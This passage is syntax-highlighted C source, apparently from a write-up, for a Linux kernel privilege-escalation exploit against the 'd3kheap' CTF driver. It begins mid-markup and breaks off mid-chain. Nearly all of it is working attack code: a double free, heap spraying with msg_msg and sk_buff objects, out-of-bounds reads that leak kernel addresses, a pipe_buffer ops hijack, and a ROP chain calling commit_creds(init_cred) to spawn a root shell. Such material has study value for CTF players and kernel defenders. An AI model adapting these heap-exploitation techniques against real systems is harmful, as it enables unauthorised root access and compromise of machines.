class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br></pre></td><td class="code"><pre><code class="hljs c">define _GNU_SOURCE <br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_QUEUE_NR 0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NR 0x80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NR 4096</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG 0xDEADBEEF</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NR 0x80</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MASTER_MSG_SZ 96</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MASTER_MSG_TYPE 0x41</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVANT_MSG_SZ 0x400</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVANT_MSG_TYPE 0x42</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE 0xC0DE</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ALLOC_FLAG 0x1234</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FREE_FLAG 0xDEAD</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff8203fe40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82c6d580</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RSI_POP_RSP_POP4_RET 0xffffffff812dbede</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810938f0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810d25c0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETRUN_TO_USERMODE 0xffffffff81c00ff0</span><br><br><span class="hljs-type">char</span> fake_servant_msg[<span class="hljs-number">704</span>];  <span class="hljs-comment">/* sk_buff need include a tail, so the size(1024 - 320) should be set for the buff */</span><br><span class="hljs-type">int</span> dev_fd;                 <span class="hljs-comment">/* using by filesystem */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>&#123;</span><br>    <span class="hljs-type">void</span>* m_next;<br>    <span class="hljs-type">void</span>* m_prev;<br>    <span class="hljs-type">long</span> m_type;<br>    <span class="hljs-type">size_t</span> m_ts;<br>    <span class="hljs-type">size_t</span> next;<br>    <span class="hljs-type">size_t</span> security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span>&#123;</span><br>    <span class="hljs-type">size_t</span> *next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[SERVANT_MSG_SZ - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;servant_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[MASTER_MSG_SZ - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;master_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[<span class="hljs-number">0x2000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125;oob_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>	<span class="hljs-type">size_t</span> page;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br>	<span class="hljs-type">size_t</span> ops;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span>&#123;</span><br>    <span class="hljs-type">size_t</span> confirm;<br>    <span class="hljs-type">size_t</span> release;<br>    <span class="hljs-type">size_t</span> try_steal;<br>    <span class="hljs-type">size_t</span> get;<br>&#125;;<br><br><span class="hljs-comment">/* to run the exp on the specific core only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * save the process current context</span><br><span class="hljs-comment"> * */</span><br><span class="hljs-type">size_t</span> user_cs, user_ss,user_rflags,user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span>&#123;<br>  __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>          <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>          <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>          <span class="hljs-string">&quot;pushf;&quot;</span><br>          <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>          );<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m Status has been saved . \033[0m&quot;</span>);<br>&#125;<br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:0x%lx\n&quot;</span>, str, x)</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>	 <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[-]%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">get_msg</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">send_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span>* msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span>&#123;<br>    ((<span class="hljs-keyword">struct</span> msgbuf *)msgp)-&gt;mtype = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">recv_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span>* msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">copy_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span>* msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">alloc</span><span class="hljs-params">()</span>&#123;<br>    ioctl(dev_fd, ALLOC_FLAG, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>&#123;<br>    ioctl(dev_fd, FREE_FLAG, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spray_skb</span><span class="hljs-params">(<span class="hljs-type">int</span> skb_queue[SK_QUEUE_NR][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buffer, <span class="hljs-type">size_t</span> size)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SK_QUEUE_NR; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NR; j++)&#123;<br>            <span class="hljs-keyword">if</span>(write(skb_queue[i][<span class="hljs-number">0</span>], buffer, size) &lt; <span class="hljs-number">0</span>)&#123;<br>                error_log(<span class="hljs-string">&quot;Spraying sk_buff failed!&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">free_skb</span><span class="hljs-params">(<span class="hljs-type">int</span> skb_queue[SK_QUEUE_NR][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buffer, <span class="hljs-type">size_t</span> size)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i= <span class="hljs-number">0</span>; i &lt; SK_QUEUE_NR; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NR; j++)&#123;<br>            <span class="hljs-keyword">if</span>(read(skb_queue[i][<span class="hljs-number">1</span>], buffer, size) &lt; <span class="hljs-number">0</span>)&#123;<br>                error_log(<span class="hljs-string">&quot;Free sk_buff failed!&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">build_msg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg* builded_msg, <span class="hljs-type">void</span>* m_next, <span class="hljs-type">void</span>* m_prev, <span class="hljs-type">long</span> mtype, <span class="hljs-type">size_t</span> m_ts, <span class="hljs-type">size_t</span> next)</span>&#123;<br>    builded_msg-&gt;m_next = m_next;<br>    builded_msg-&gt;m_prev = m_prev;<br>    builded_msg-&gt;m_type = mtype;<br>    builded_msg-&gt;m_ts = m_ts;<br>    builded_msg-&gt;next = next;<br>    builded_msg-&gt;security = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_rootshell</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">if</span>(getuid())&#123;<br>        error_log(<span class="hljs-string">&quot;Priviledge elevation failed!&quot;</span>);<br>    &#125;<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> skb_queue[SK_QUEUE_NR][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span> msg_queue[MSG_QUEUE_NR];    <br>    <span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span> victim_qidx = <span class="hljs-number">-1</span>;<br>    <span class="hljs-type">size_t</span> victim_addr;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> <span class="hljs-title">nearby_msg</span>, <span class="hljs-title">nearby_master_msg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pipe_buffer_ptr</span>;</span><br>    <span class="hljs-type">size_t</span> *ROPchain;<br>    <span class="hljs-type">size_t</span> ropchain_idx;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops_ptr</span>;</span><br><br>    <span class="hljs-type">size_t</span> kernel_base, page_offset_base, kernel_offset, guess_page_offset;<br><br>    info_log(<span class="hljs-string">&quot;Step I:Preserve the process context and bind one core... &quot;</span>);<br>    bind_cpu(<span class="hljs-number">0</span>);<br>    saveStatus();<br>    <br>    info_log(<span class="hljs-string">&quot;Step II:Spray the sk_queue and msg_queue...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SK_QUEUE_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, skb_queue[i]) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Allocate the socket_queue failed!&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>((msg_queue[i] = get_msg()) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Allocate the msg_queue failed!&quot;</span>);<br>        &#125;<br>    &#125;<br>    dev_fd = open(<span class="hljs-string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);<br>    alloc();<br><br>    info_log(<span class="hljs-string">&quot;Step III:Construct the UAF...&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(&amp;master_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(master_msg));<br>    <span class="hljs-built_in">memset</span>(&amp;servant_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(servant_msg));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NR; i++)&#123;<br>        <span class="hljs-comment">/* Allocate the master msg_msg */</span><br>        *(<span class="hljs-type">int</span> *)&amp;master_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;master_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span>(send_msg(msg_queue[i], &amp;master_msg, <span class="hljs-keyword">sizeof</span>(master_msg), MASTER_MSG_TYPE) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Allocate the master msg_msg failed!&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">/* Allocate the servant msg_msg */</span><br>        *(<span class="hljs-type">int</span> *)&amp;servant_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;servant_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span>(send_msg(msg_queue[i], &amp;servant_msg, <span class="hljs-keyword">sizeof</span>(servant_msg), SERVANT_MSG_TYPE) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Allocate the servant msg_msg failed!&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">/* First free the d3kheap object */</span><br>        <span class="hljs-keyword">if</span>(i == <span class="hljs-number">1024</span>)<br>           delete();<br>    &#125;<br><br>    info_log(<span class="hljs-string">&quot;Step IV:Search for the UAF msg_msg...&quot;</span>);<br>    <span class="hljs-comment">/* Second free the d3kheap object */</span><br>    delete();<br>    build_msg((<span class="hljs-keyword">struct</span> msg_msg *)fake_servant_msg, (<span class="hljs-type">void</span> *)<span class="hljs-string">&quot;peiwithhao&quot;</span>, (<span class="hljs-type">void</span>*)<span class="hljs-string">&quot;peiwithhao&quot;</span>, *(<span class="hljs-type">long</span> *)<span class="hljs-string">&quot;peiwithhao&quot;</span>, SERVANT_MSG_SZ, <span class="hljs-number">0</span>);<br>    spray_skb(skb_queue, (<span class="hljs-type">void</span> *)fake_servant_msg, <span class="hljs-keyword">sizeof</span>(fake_servant_msg));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(copy_msg(msg_queue[i], &amp;servant_msg, <span class="hljs-keyword">sizeof</span>(servant_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>            victim_qidx = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(victim_qidx == <span class="hljs-number">-1</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;You have not found the victim msg_msg queue idx:(...&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]the victim msg_msg idx is :%d\n&quot;</span>, victim_qidx);<br>    free_skb(skb_queue, (<span class="hljs-type">void</span> *)fake_servant_msg, <span class="hljs-keyword">sizeof</span>(fake_servant_msg));<br><br>    info_log(<span class="hljs-string">&quot;Step V:Overread the victim msg_msg&#x27;s nearby servant msg_msg&quot;</span>);<br>    build_msg((<span class="hljs-keyword">struct</span> msg_msg *)fake_servant_msg, (<span class="hljs-type">void</span> *)<span class="hljs-string">&quot;peiwithhao&quot;</span>, (<span class="hljs-type">void</span> *)<span class="hljs-string">&quot;peiwithhao&quot;</span>, VICTIM_MSG_TYPE, <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <span class="hljs-number">0</span>);<br>    spray_skb(skb_queue, (<span class="hljs-type">void</span> *)fake_servant_msg, <span class="hljs-keyword">sizeof</span>(fake_servant_msg));<br>    <span class="hljs-comment">/* We could oob read the next nearby servant msg_msg */</span><br>    <span class="hljs-keyword">if</span>(copy_msg(msg_queue[victim_qidx], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;OOB read failed!&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * check the memory</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">    for(int i = 0; i &lt; 0x10; i++)&#123;</span><br><span class="hljs-comment">        printf(&quot;[--- memory dump ---](%2d)0x%x\n&quot;, i, *(int *)&amp;oob_msg.mtext[0x400 + i*4]);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span>(*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[<span class="hljs-number">0x400</span>] != MSG_TAG)&#123;<br>        error_log(<span class="hljs-string">&quot;Unfortunatally! The nearby object had already been occupied!&quot;</span>);<br>    &#125;<br>    nearby_msg = *(<span class="hljs-keyword">struct</span> msg_msg*)&amp;oob_msg.mtext[SERVANT_MSG_SZ - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    guess_page_offset = (<span class="hljs-type">size_t</span>)(nearby_msg.m_next)&amp;(<span class="hljs-number">0xfffffffff0000000</span>);<br>    PRINT_ADDR(<span class="hljs-string">&quot;guess page_offset_base&quot;</span>, guess_page_offset);<br>    <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Find the victim msg_msg addr</span><br><span class="hljs-comment">     * */</span><br>    info_log(<span class="hljs-string">&quot;Step VI:Get the victim msg_msg addr through nearby servant msg_msg...&quot;</span>);<br>    free_skb(skb_queue, (<span class="hljs-type">void</span> *)fake_servant_msg, <span class="hljs-keyword">sizeof</span>(fake_servant_msg));<br>    build_msg((<span class="hljs-keyword">struct</span> msg_msg *)fake_servant_msg, (<span class="hljs-type">void</span> *)<span class="hljs-string">&quot;peiwithhao&quot;</span>, (<span class="hljs-type">void</span> *)<span class="hljs-string">&quot;peiwithhao&quot;</span>, VICTIM_MSG_TYPE, <span class="hljs-keyword">sizeof</span>(oob_msg.mtext), (<span class="hljs-type">size_t</span>)(nearby_msg.m_prev) - <span class="hljs-number">8</span>);<br>    spray_skb(skb_queue, (<span class="hljs-type">void</span> *)fake_servant_msg, <span class="hljs-keyword">sizeof</span>(fake_servant_msg));<br>    <span class="hljs-keyword">if</span>(copy_msg(msg_queue[victim_qidx], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;Cannot find the nearby master msg_msg...&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[<span class="hljs-number">0x1000</span>] != MSG_TAG)&#123;<br>        error_log(<span class="hljs-string">&quot;Unfortunatally! The nearby object had already been occupied!&quot;</span>);<br>    &#125;<br>    nearby_master_msg = *(<span class="hljs-keyword">struct</span> msg_msg*)&amp;oob_msg.mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    PRINT_ADDR(<span class="hljs-string">&quot;nearby msg_msg addr&quot;</span>, (<span class="hljs-type">size_t</span>)nearby_master_msg.m_next);<br>    victim_addr = (<span class="hljs-type">size_t</span>)nearby_master_msg.m_next - <span class="hljs-number">0x400</span>; <br>    PRINT_ADDR(<span class="hljs-string">&quot;victim_addr&quot;</span>, victim_addr);<br>    <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Construct the UAF sk_buff</span><br><span class="hljs-comment">     * */</span><br>    info_log(<span class="hljs-string">&quot;Step VII:Fix the msg_msg and free it, so we get the uaf sk_buff...&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(&amp;fake_servant_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(fake_servant_msg));<br>    free_skb(skb_queue, (<span class="hljs-type">void</span> *)fake_servant_msg, <span class="hljs-keyword">sizeof</span>(fake_servant_msg));<br>    build_msg((<span class="hljs-keyword">struct</span> msg_msg*)fake_servant_msg, (<span class="hljs-type">void</span> *)victim_addr + <span class="hljs-number">0x800</span> , (<span class="hljs-type">void</span> *)victim_addr + <span class="hljs-number">0x800</span>, VICTIM_MSG_TYPE, SERVANT_MSG_TYPE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <span class="hljs-number">0</span>);<br>    spray_skb(skb_queue, (<span class="hljs-type">void</span> *)fake_servant_msg, <span class="hljs-keyword">sizeof</span>(fake_servant_msg));<br>    <span class="hljs-keyword">if</span>(recv_msg(msg_queue[victim_qidx], &amp;servant_msg, <span class="hljs-keyword">sizeof</span>(servant_msg), VICTIM_MSG_TYPE) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;unlink the victim servant msg_msg failed!&quot;</span>);<br>    &#125;<br>    <br>    info_log(<span class="hljs-string">&quot;Step VIII:Make the pipe_buf with sk_buff in victim 1k object...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i ++)&#123;<br>        <span class="hljs-keyword">if</span>(pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Allocate the pipe failed!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;peiwithhao&quot;</span>, <span class="hljs-number">10</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Write to the pipe failed!&quot;</span>);<br>        &#125;<br>    &#125;<br>    pipe_buffer_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *)&amp;fake_servant_msg;    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i= <span class="hljs-number">0</span>; i &lt; SK_QUEUE_NR; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NR; j++)&#123;<br>            <span class="hljs-keyword">if</span>(read(skb_queue[i][<span class="hljs-number">1</span>], &amp;fake_servant_msg, <span class="hljs-keyword">sizeof</span>(fake_servant_msg)) &lt; <span class="hljs-number">0</span>)&#123;<br>                error_log(<span class="hljs-string">&quot;Free sk_buff failed!&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(pipe_buffer_ptr-&gt;ops &gt; <span class="hljs-number">0xffffffff81000000</span>)&#123;<br>                kernel_offset = pipe_buffer_ptr-&gt;ops - ANON_PIPE_BUF_OPS; <br>                kernel_base = <span class="hljs-number">0xffffffff81000000</span> + kernel_offset;<br>            &#125;<br>        &#125;<br>    &#125;<br>    PRINT_ADDR(<span class="hljs-string">&quot;kernel_base&quot;</span>, kernel_base);<br>    PRINT_ADDR(<span class="hljs-string">&quot;kernel_offset&quot;</span>, kernel_offset);<br>    <br>    info_log(<span class="hljs-string">&quot;Step IX:Hijack the pipe_buffer-&gt;ops-&gt;release...&quot;</span>);<br>    pipe_buffer_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *)&amp;fake_servant_msg;<br>    pipe_buffer_ptr-&gt;page = *(<span class="hljs-type">size_t</span> *)<span class="hljs-string">&quot;peiwithhao&quot;</span>;<br>    pipe_buffer_ptr-&gt;ops = victim_addr + <span class="hljs-number">0x100</span>;<br><br>    ops_ptr = (<span class="hljs-keyword">struct</span> pipe_buf_operations *)&amp;fake_servant_msg[<span class="hljs-number">0x100</span>];<br>    ops_ptr-&gt;release = PUSH_RSI_POP_RSP_POP4_RET + kernel_offset;<br><br>    ROPchain = (<span class="hljs-type">size_t</span> *)&amp;fake_servant_msg[<span class="hljs-number">0x20</span>]; <br>    ropchain_idx = <span class="hljs-number">0</span>;<br>    ROPchain[ropchain_idx++] = POP_RDI_RET + kernel_offset;<br>    ROPchain[ropchain_idx++] = INIT_CRED + kernel_offset;<br>    ROPchain[ropchain_idx++] = COMMIT_CREDS + kernel_offset;<br>    ROPchain[ropchain_idx++] = SWAPGS_RESTORE_REGS_AND_RETRUN_TO_USERMODE + <span class="hljs-number">22</span> + kernel_offset;<br>    ROPchain[ropchain_idx++] = <span class="hljs-number">0xdeadbeef</span>;<br>    ROPchain[ropchain_idx++] = <span class="hljs-number">0xbeefdead</span>;<br>    ROPchain[ropchain_idx++] = (<span class="hljs-type">size_t</span>)get_rootshell;<br>    ROPchain[ropchain_idx++] = user_cs;<br>    ROPchain[ropchain_idx++] = user_rflags;<br>    